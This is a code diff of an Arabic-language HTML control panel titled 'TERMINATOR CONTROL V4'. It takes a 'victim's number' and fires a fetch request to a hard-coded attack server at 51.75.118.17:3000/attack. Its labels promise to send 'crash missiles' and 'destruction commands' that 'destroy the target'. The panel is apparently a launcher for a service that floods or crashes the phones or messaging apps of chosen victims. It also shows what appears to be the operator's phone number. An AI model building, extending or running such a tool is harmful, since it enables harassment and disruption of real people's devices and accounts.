@@ -3,47 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINATOR DASHBOARD</title>
+    <title>TERMINATOR CONTROL V4</title>
     <style>
-        body { background: #0f0f0f; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1a1a1a; padding: 30px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; border: 1px solid #333; }
-        h1 { color: #ff3e3e; font-size: 24px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #444; background: #252525; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background: linear-gradient(45deg, #ff0000, #800000); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { transform: scale(1.02); box-shadow: 0 0 15px #ff0000; }
-        #log { margin-top: 15px; font-size: 14px; color: #888; }
+        body { 
+            background: #0a0a0a; 
+            color: #ff0000; 
+            font-family: 'Courier New', Courier, monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        .container { 
+            background: rgba(20, 20, 20, 0.9); 
+            padding: 40px; 
+            border: 2px solid #ff0000; 
+            border-radius: 15px; 
+            box-shadow: 0 0 30px #ff0000; 
+            text-align: center; 
+            width: 90%; 
+            max-width: 450px;
+        }
+        h1 { font-size: 28px; text-shadow: 2px 2px #550000; margin-bottom: 30px; }
+        input { 
+            width: 100%; 
+            padding: 15px; 
+            margin-bottom: 25px; 
+            background: #111; 
+            border: 1px solid #550000; 
+            color: #00ff00; 
+            font-size: 18px; 
+            border-radius: 5px; 
+            box-sizing: border-box;
+            outline: none;
+        }
+        input:focus { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; }
+        button { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(45deg, #800000, #ff0000); 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: 0.3s;
+        }
+        button:hover { background: linear-gradient(45deg, #ff0000, #ff5555); transform: scale(1.02); }
+        button:active { transform: scale(0.98); }
+        #status { margin-top: 20px; font-weight: bold; font-size: 16px; min-height: 24px; }
+        .footer { margin-top: 20px; color: #555; font-size: 12px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>💀 TERMINATOR V4</h1>
-        <p>التحكم عن بعد: 212718849067</p>
-        <input type="text" id="target" placeholder="رقم الضحية (بدون +)">
-        <button onclick="launch()">إرسال صواريخ الكراش 🚀</button>
-        <div id="log">جاهز لتنفيذ الأوامر...</div>
+
+    <div class="container">
+        <h1>☠️ TERMINATOR V4 ☠️</h1>
+        <p style="color: #aaa; margin-bottom: 20px;">التحكم بالسيرفر: 51.75.118.17</p>
+        
+        <input type="text" id="targetNumber" placeholder="رقم الضحية (مثال: 212600000000)">
+        
+        <button onclick="sendAttack()">إطلاق الهجوم الشامل 🚀</button>
+        
+        <div id="status"></div>
+
+        <div class="footer">
+            متصل عبر Katabump Engine | 212718849067
+        </div>
     </div>
 
     <script>
-        async function launch() {
-            const num = document.getElementById('target').value;
-            const log = document.getElementById('log');
-            if(!num) return alert("أدخل الرقم أولاً!");
+        async function sendAttack() {
+            const num = document.getElementById('targetNumber').value;
+            const status = document.getElementById('status');
             
-            log.innerText = "⚡ جاري الاتصال بالسيرفر...";
+            if (!num || num.length < 10) {
+                status.style.color = "#ffff00";
+                status.innerText = "❌ يرجى إدخال رقم هاتف صحيح!";
+                return;
+            }
+
+            status.style.color = "#00ffff";
+            status.innerText = "⚡ جاري إرسال أوامر التدمير...";
+
             try {
-                // هنا نضع رابط السيرفر الذي يشغل البوت (مثل Render)
-                const response = await fetch(`https://YOUR-BACKEND-URL.com/attack?number=${num}`);
-                if(response.ok) {
-                    log.style.color = "#00ff00";
-                    log.innerText = "✅ تم إرسال حزم التدمير بنجاح!";
+                // الربط المباشر مع سيرفر Katabump الخاص بك
+                const serverUrl = `http://51.75.118.17:3000/attack?number=${num}`;
+                
+                const response = await fetch(serverUrl);
+
+                if (response.ok) {
+                    status.style.color = "#00ff00";
+                    status.innerText = "✅ تم تدمير الهدف بنجاح! راقب الكونسول.";
                 } else {
-                    throw new Error();
+                    status.style.color = "#ff0000";
+                    status.innerText = "❌ السيرفر لا يستجيب، تأكد من تشغيل Katabump.";
                 }
-            } catch (e) {
-                log.style.color = "#ff3e3e";
-                log.innerText = "❌ فشل الاتصال بالسيرفر!";
+            } catch (error) {
+                console.error(error);
+                status.style.color = "#ff0000";
+                status.innerText = "⚠️ خطأ في الشبكة! تأكد من السماح بـ Insecure Content في المتصفح.";
             }
         }
     </script>
 </body>
-</html>
+    </html>
+    
